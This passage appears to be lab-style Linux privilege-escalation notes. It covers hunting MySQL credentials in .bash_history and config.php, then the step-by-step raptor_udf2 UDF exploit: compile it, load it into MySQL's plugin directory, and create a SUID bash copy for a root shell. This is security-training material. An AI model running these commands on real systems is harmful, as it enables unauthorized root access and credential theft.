Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes.
# Hunting for Database Credentials

We could firstly try to sign in without a password since the default for MySQL root user is blank password using `mysql -u root -p`, but if it didn't work, we might have to try other methods.
### Method 1

First, we should always be checking the **.bash_history** file in our current users home directory, as well as any other users home directory that we have access to.

```bash
cd /home && ls -l
```

If there are multiple profiles in here, try to access all of them. Note that we did not see root’s home profile here because the root home profile is located at /root. Also note that bash history files are hidden so they start with a period [ . ] and can be seen by using **ls -la**.

```bash
cd juggernaut && cat .bash_history
```
### Method 2 

Navigating to /var/www/, we can see that there are a few files here, but ‘config.php’ stands out most of all.

And when we check the file, we can see that it is used to access the MySQL database as root and shows the cleartext username and password.
# Exploitation

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

```bash
cd /home/user/tools/mysql-udf
```

Compile the raptor_udf2.c exploit code using the following commands:

```bash
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:

```bash
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit.

These commands are used to create a table with one (BLOB) column. Then we insert the contents of the file specified by `/path/to/file` into the table `foo` and selects all the rows from the table `foo` and writes them to a file called `raptor_udf2.so` in the directory `/usr/lib/mysql/plugin`. Next, we create a MySQL function called `do_system` and specifying the shared library file `raptor_udf2.so`, Finally we get a simple UDF that allows executing system commands from within a MySQL query:

```bash
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```